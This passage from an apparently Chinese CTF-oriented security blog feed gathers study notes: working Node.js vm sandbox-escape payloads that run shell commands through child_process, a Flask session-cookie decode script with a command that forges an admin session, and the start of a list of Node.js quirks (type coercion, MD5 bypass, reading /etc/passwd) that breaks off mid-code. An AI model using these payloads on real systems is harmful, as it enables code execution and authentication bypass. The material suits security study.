js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><h2 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h2><h3 id="this为null"><a href="#this为null" class="headerlink" title="this为null"></a>this为null</h3><p>如果遇到传入sandbox的对象为null时，该怎么办呢，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`...`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>此时this-&gt;null，无法像之前一样逃逸，这时候就得用到函数的一个内置对象属性<code>arguments.callee.caller</code></p><p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>重写了沙盒对象中的toString方法，然后再console.log触发，通过arguments.callee.caller获取到了一个沙盒外的对象，进而和上面一样获取process</p><h3 id="proxy劫持"><a href="#proxy劫持" class="headerlink" title="proxy劫持"></a>proxy劫持</h3><p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用Proxy来劫持属性</p><p>proxy就是一个hook函数，在我们去访问对象的属性时（不管是否存在）都会触发这个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;&#123;</span></span><br><span class="line"><span class="string">    const a = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></table></figure><p>如上代码就是将对象a实例化为了一个Proxy对象，然后访问abc属性（不存在）触发get方法，进而导致命令执行</p><h3 id="借助异常处理"><a href="#借助异常处理" class="headerlink" title="借助异常处理"></a>借助异常处理</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的返回值无法直接利用，应该说是没有返回值<br>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://boogipop.com/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/#vm%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8">https://boogipop.com/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/#vm%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Flask sessions伪造</title>
      <link href="/2024/03/09/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Flask-session%E4%BC%AA%E9%80%A0/"/>
      <url>/2024/03/09/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Flask-session%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="客户端-Session"><a href="#客户端-Session" class="headerlink" title="客户端 Session"></a>客户端 Session</h2><p>一般情况下，在 PHP 开发中，<code>$_SESSION</code> 变量的内容默认会被保存在服务端的一个文件中，并使用一个叫 <code>PHPSESSID</code> 的 Cookie 的值来区分不同用户的 session。由于这类 Session 的内容存储在服务端，所以这类 Session 是 “服务端 Session”，而用户在 Cookie 中看到的只是 Session 的名称（一个随机字符串）。</p><p>然而，并不是所有语言都有默认的 Session 存储机制，也不是任何情况下我们都可以向服务器写入文件。比如对于 Flask 框架，就将 Session 存储在了客户端的 Cookie 中。</p><p>因为 Cookie 实际上是存储在客户端（浏览器）中的，所以这类 Session 被称为 “客户端 Session”。而将 Session 存储在客户端 Cookie 中，最重要的就是解决 Session 不能被篡改的问题。</p><p>Flask 对 Session 的处理机制的主要过程如下：</p><ol><li>json.dumps 将对象转换成 json 字符串，作为数据</li><li>如果数据压缩后长度更短，则用 zlib 库进行压缩</li><li>将数据进行 Base64 编码</li><li>通过 hmac 算法计算数据的签名，将签名附在数据后，并用 <code>.</code> 分割</li></ol><p>最后经过 Flask 处理的 Session 字符串的格式为：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</span><br><span class="line"><span class="comment"># 例如: eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XzTQmw.3MN2SDWfDYfp6d3JwFziNcK2NwQ</span></span><br></pre></td></tr></table></figure><h2 id="Flask-Session-伪造"><a href="#Flask-Session-伪造" class="headerlink" title="Flask Session 伪造"></a>Flask Session 伪造</h2><p>Flask 是把 Session 存在客户端的，而且只经过 Base64 编码和用密钥签名。在进行 Session 的签名时需要用到一个预先设置的全局变量 <code>secret_key</code> ，而如果此时泄露了 <code>secret_key</code> ，攻击者就可以利用泄露的 <code>secret_key</code> 伪造签名，从而伪造出攻击者想要的 Flask Session。</p><p>通常情况下获取 <code>secret_key</code> 的方法有以下几种：</p><ul><li>网站某处泄露获取</li><li>通过 SSTI 漏洞获取，如 <code>/&#123;&#123;config&#125;&#125;</code></li><li>通过 SSRF 读取存在 <code>secret_key</code> 的 Flask 配置文件或读取 &#x2F;proc&#x2F;self&#x2F;environ 获取</li><li>爆破</li></ul><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decode.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 decode.py <span class="string">&quot;.eJw9kMGKwjAURX9leGsXNWM3gguHVKnwXrCkhmQjaqtp2ihUJU7Ef58ig-tzOZd7n7A99vXVwvTW3-sRbJsKpk_42sMUxHJldbStUXki-KYjl0fi84nxC4-u8kLpoGPVEl91mpWJUWtGsmiQL6yWZTJwRp4suYH7IevalHgWjcwZRf0gXjUks1TH9YPipkNVOK3KSO5ncJsGPQbklSefBSN1Sh4jSgzEdRD8MCGWBVwWjeA4g9cIDtf-uL1d2vr8mUDOOmLUolp1QuIv8ZJpubHo5qmQ5TfJNkWFkd61J4bOdGY9e-savzvVH9Ne5aH4J-edHwAEe9n5BkZwv9b9-zgYJ_D6A6rfbpQ.YIf05Q.JSosWcpGNzrOtCqWZPupfztjIwg&quot;</span></span><br></pre></td></tr></table></figure><p>工具:  <a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a></p><p>有了 <code>secret_key</code> 之后，我们便可以开始伪造 Session 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;ckj123&quot;</span> -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8bac8deb485e623408faf27f9f0c7d42ece4ed654b01aa549f66ca62ebf0b99413e2676147b519c4175e1dcae360f9fb2c007f6a0e696c31304608787a00db83&#x27;, &#x27;csrf_token&#x27;: b&#x27;68c7cd1be932456a5a2099575991c35e368626ee&#x27;, &#x27;image&#x27;: b&#x27;mb0E&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>例题: <a href="https://www.cnblogs.com/GTL-JU/p/16960460.html">https://www.cnblogs.com/GTL-JU/p/16960460.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新周记6</title>
      <link href="/2024/03/03/%E5%91%A8%E8%AE%B0-2024-03-03-%E6%96%B0%E5%91%A8%E8%AE%B06/"/>
      <url>/2024/03/03/%E5%91%A8%E8%AE%B0-2024-03-03-%E6%96%B0%E5%91%A8%E8%AE%B06/</url>
      
        <content type="html"><![CDATA[<p>总结:</p><p><a href="https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/">https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/</a></p><p><a href="https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p><a href="https://hades-blog.github.io/2024/03/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/">https://hades-blog.github.io/2024/03/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Nodejs特性利用</title>
      <link href="/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/"/>
      <url>/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1-nodejs-语言的缺点"><a href="#1-nodejs-语言的缺点" class="headerlink" title="1.nodejs 语言的缺点"></a><strong>1.nodejs 语言的缺点</strong></h2><h3 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a><strong>大小写特性</strong></h3><p>toUpperCase()</p><p>toLowerCase()</p><p>对于 toUpperCase(): 字符 <code>&quot;ı&quot;</code>、<code>&quot;ſ&quot;</code> 经过 toUpperCase 处理后结果为 <code>&quot;I&quot;</code>、<code>&quot;S&quot;</code><br>对于 toLowerCase(): 字符 <code>&quot;K&quot;</code> 经过 toLowerCase 处理后结果为 <code>&quot;k&quot;</code>(这个 K 不是 K)</p><h2 id="2-弱类型比较"><a href="#2-弱类型比较" class="headerlink" title="2.弱类型比较"></a>2.<strong>弱类型比较</strong></h2><ul><li><em>大小比较</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>==<span class="string">&#x27;1&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span><span class="string">&#x27;2&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span><span class="string">&#x27;3&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span><span class="string">&#x27;3&#x27;</span>); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;asd&#x27;</span><span class="number">1</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为 ASCII 码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是 false</p><ul><li><em>数组的比较：</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]==[]); <span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([][]); <span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">6</span>,<span class="number">2</span>][<span class="number">5</span>]); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">100</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;test&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span>);  <span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">11</span>,<span class="number">16</span>]&lt;<span class="string">&quot;10&quot;</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>总结：空数组之间比较永远为 false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</p><ul><li><em>还有一些比较特别的相等：</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>==<span class="literal">undefined</span>) <span class="comment">// 输出：true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>===<span class="literal">undefined</span>) <span class="comment">// 输出：false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>==<span class="title class_">NaN</span>)  <span class="comment">// 输出：false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>===<span class="title class_">NaN</span>)  <span class="comment">// 输出：false</span></span><br></pre></td></tr></table></figure><ul><li><em>变量拼接</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,3 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure><h3 id="MD5-的绕过"><a href="#MD5-的绕过" class="headerlink" title="MD5 的绕过"></a><strong>MD5 的绕过</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure><p>传入 a[x]&#x3D;1&amp;b[x]&#x3D;2</p><p>数组会被解析成 <code>[object Object]</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a><strong>编码绕过</strong></h3><ul><li><em>16 进制编码</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>===<span class="string">&quot;\x61&quot;</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li><em>unicode 编码</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u0061&quot;</span>===<span class="string">&quot;a&quot;</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li><em>base 编码</em></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><h2 id="3-nodejs-危险函数的利用"><a href="#3-nodejs-危险函数的利用" class="headerlink" title="3.nodejs 危险函数的利用"></a><strong>3.nodejs 危险函数的利用</strong></h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><ul><li>exec()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;open /System/Applications/Calculator.app&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>eval()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(<span class="string">&quot;document.cookie&quot;</span>)); <span class="comment">//执行document.cookie</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;document.cookie&quot;</span>); <span class="comment">//输出document.cookie</span></span><br></pre></td></tr></table></figure><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a><strong>文件读写</strong></h3><ul><li><strong>读</strong></li></ul><ol><li>readFileSync()</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFile</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;<span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title 